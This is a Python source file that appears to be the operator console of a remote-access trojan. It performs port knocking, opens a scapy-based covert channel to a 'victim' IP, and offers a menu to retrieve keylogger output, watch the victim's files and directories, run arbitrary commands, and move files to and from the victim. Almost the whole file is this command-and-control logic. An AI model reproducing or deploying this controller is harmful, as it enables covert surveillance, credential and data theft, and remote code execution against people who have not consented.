import argparse
from watcher import *
from covertChannel import *
from scapy.all import *
from scapy.layers.inet import *
from utils import get_ip_address, make_dir, display_menu
from portknocker import perform_knock_sequence

def watching(covert):
    while True:
        covert.receive_data(for_victim=False)


def handle_choice(covert: CovertChannel):
    watcher_instance = Watcher()

    while True:
        input("Press ENTER to continue")
        display_menu()

        try:
            choice = int(input("Enter your choice: "))
        except ValueError:
            print("ERROR OCCURRED, TRY AGAIN")
            continue

        covert.cmd = choice
        covert.send_data(for_victim=True)
        covert.cmd = None

        if choice == 3:
            sig = int(covert.receive_data(for_victim=False))
            if sig == 1:
                print(f"COMMANDER:: Keylogger should be Stopped before transferring keylog file")
                continue
            elif sig == 2:
                print(f"COMMANDER:: keylog file does not exist")
                continue
            covert.receive_data(for_victim=False)

        elif choice == 4:
            file = input("Enter the file path to watch on the victim: ")
            covert.cmd = file
            covert.is_watching = True
            covert.send_data(for_victim=True)
            covert.cmd = None

            sig = int(covert.receive_data(for_victim=False))
            if not sig:
                print(f"COMMANDER:: Error Occurred, file path not found")
                continue

            if not watcher_instance.get_status():
                watcher_instance.toggle_file()
                watcher_instance.toggle_status()
                file_watching_process = multiprocessing.Process(target=watching, args=(covert, ))
                file_watching_process.start()
                print(f"COMMANDER:: Watcher Started on {file}...")
                watcher_instance.set_child(file_watching_process)
            else:
                if not watcher_instance.watching_dir_or_file():
                    print(f"COMMADER:: Watching a File already...")
                elif watcher_instance.watching_dir_or_file():
                    print(f"COMMANDER:: Watching a Directory already..")

        elif choice == 6:
            direc = input("Enter the directory path to watch on the victim: ")
            covert.cmd = direc
            covert.is_watching = True
            covert.send_data(for_victim=True)
            covert.cmd = None
            sig = int(covert.receive_data(for_victim=False))
            if not sig:
                print(f"COMMANDER:: Error Occurred, directory path not found")
                continue
            if not watcher_instance.get_status():
                watcher_instance.toggle_dir()
                watcher_instance.toggle_status()
                dir_watching_process = multiprocessing.Process(target=watching, args=(covert, ))
                dir_watching_process.start()
                print(f"COMMANDER:: Watcher Started on {direc}...")
                watcher_instance.set_child(dir_watching_process)
            else:
                if not watcher_instance.watching_dir_or_file():
                    print(f"COMMADER:: Watching a File already...")
                elif watcher_instance.watching_dir_or_file():
                    print(f"COMMANDER:: Watching a Directory already..")

        elif choice == 5 or choice == 7:
            covert.is_watching = False
            if watcher_instance.get_status():
                watcher_instance.stop_watching()
            elif not watcher_instance.get_status():
                print("COMMANDER:: Watcher instance is not running")
        
        elif choice == 8:
            prog = input("Enter the command/program to run on the victim: ")
            covert.cmd = prog
            covert.send_data(for_victim=True)
            covert.cmd = None
            sig = covert.receive_data(for_victim=False)
            if not sig:
                print(f"COMMANDER:: Error Occurred, program could not be run")
            else:
                print(f"COMMANDER:: Program Executed Successfully on Victim\n {sig}")

        elif choice == 9:
            file = input("Enter file name to transfer FROM victim: ")
            covert.cmd = file
            covert.is_watching = False
            covert.send_data(for_victim=True)
            covert.cmd = None

            covert.receive_data(for_victim=False)

        elif choice == 10:
            file = input("Enter file name to transfer TO victim: ")
            
            covert.file_name = file
            covert.send_data(for_victim=True, event="IN_CREATE")
            covert.file_name = None

            sig = int(covert.receive_data(for_victim=False))
            if not sig:
                print(f"COMMANDER:: Error Occurred, file could not be transferred")
            else:
                print(f"COMMANDER:: Transferred file successful\n")


        elif choice == 11:
            print(f"COMMANDER:: DISCONNECTING")
            break

        elif choice == 12:
            print(f"COMMANDER:: Wiping everything from the victim...")
            pass


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-ip', dest='ip', type=str, help="Victim's IP address", required=True)
    parser.add_argument('-dport', '--dest_port', type=int, dest='dst_port', help="Victim's port number", default=6000)
    parser.add_argument('-sport', '--src_port', type=int, dest='src_port', help="Commander's port number", default=7000)
    args = parser.parse_args()

    covert_channel = CovertChannel(
        cmd_addr=get_ip_address(),
        cmd_port=args.src_port,
        victim_addr=args.ip,
        victim_port=args.dst_port
    )

    print("COMMANDER:: Initiating Port Knocking...")
    perform_knock_sequence(args.ip, time_out=2)
    
    make_dir(covert_channel.victim_addr)
    handle_choice(covert_channel)


if __name__ == "__main__":
    main()
